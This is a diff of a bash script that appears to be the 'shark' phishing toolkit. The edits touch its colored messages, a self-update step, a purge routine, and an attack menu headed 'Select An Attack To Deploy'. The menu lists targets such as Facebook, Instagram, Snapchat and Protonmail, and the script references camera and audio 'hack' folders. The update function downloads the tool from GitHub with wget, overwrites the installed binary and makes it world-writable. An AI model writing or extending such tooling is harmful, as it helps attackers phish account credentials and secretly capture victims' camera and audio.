@@ -42,7 +42,7 @@ VERSION="2.0.3"
 ################
 
 msg() {
-	printf "${blue}[ - ] ${green}${1}\n${nc}"
+	printf "${green}[${white}+${green}] ${white}${1}\n${nc}"
 }
 
 norm_msg() {
@@ -50,7 +50,7 @@ norm_msg() {
 }
 
 error_msg() {
-        printf "${red}[ ! ] ${white}${1}\n${nc}"
+        printf "${red}[!] ${white}${1}\n${nc}"
 }
 
 #spinner
@@ -104,7 +104,7 @@ function os () {
 
 
 function main_update() {
-	wget https://github.com/just-hack/shark/raw/master/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark
+	os;wget https://github.com/just-hack/shark/raw/master/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark
 }
 
 
@@ -176,7 +176,7 @@ EOF
 }
 
 function purge_shark() {	
-        printf "${red} Do you wish to delete camera and audio files too ? y/n " && read ans && [ "$ans" != "${ans#[Yy]}" ] && rm -rf ${files}/Camera_hack ${files}/Audio_hack
+        os;printf "${red} Do you wish to delete camera and audio files too ? y/n : ";read ans && [ "$ans" != "${ans#[Yy]}" ];rm -rf ${files}/Camera_hack ${files}/Audio_hack
         rm -rf ${shark} ${old_shark}
 }
 
@@ -422,6 +422,14 @@ function audio_hack() {
 
 }
 
+########
+# DRIVER
+########
+
+internet
+os
+kill_session
+
 while :
 do
 	clear
@@ -439,8 +447,7 @@ do
       printf "${green}       ╚──────────────────────────────────────╝\n\n"
 
      printf "           ${green}💻 \e[1;4;5;37mSelect An Attack To Deploy\e[0m${green} 💻\n\n"
-###change banner ---- start here
-banner(){	
+function banner(){	
         printf "\e[1;92m[\e[0m\e[1;37m01\e[0m\e[1;92m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;92m[\e[0m\e[1;37m12\e[0m\e[1;92m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;92m[\e[0m\e[1;37m23\e[0m\e[1;92m] \e[0m\e[1;37;44mWordpress\e[0m\n\n"
         printf "\e[1;92m[\e[0m\e[1;37m02\e[0m\e[1;92m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;92m[\e[0m\e[1;37m13\e[0m\e[1;92m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;92m[\e[0m\e[1;37m24\e[0m\e[1;92m] \e[0m\e[1;37;43mSnapchat\e[0m\n\n" 
         printf "\e[1;92m[\e[0m\e[1;37m03\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;92m[\e[0m\e[1;37m14\e[0m\e[1;92m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;92m[\e[0m\e[1;37m25\e[0m\e[1;92m] \e[0m\e[1;37;40mProtonmail\e[0m\n\n"
@@ -459,9 +466,8 @@ banner(){
 #######
 # MAIN
 #######
-
-        os
-        kill_session
+        
+	#banner
         banner
 
         if [ $option = 01 ] || [ $option = 1 ];then		
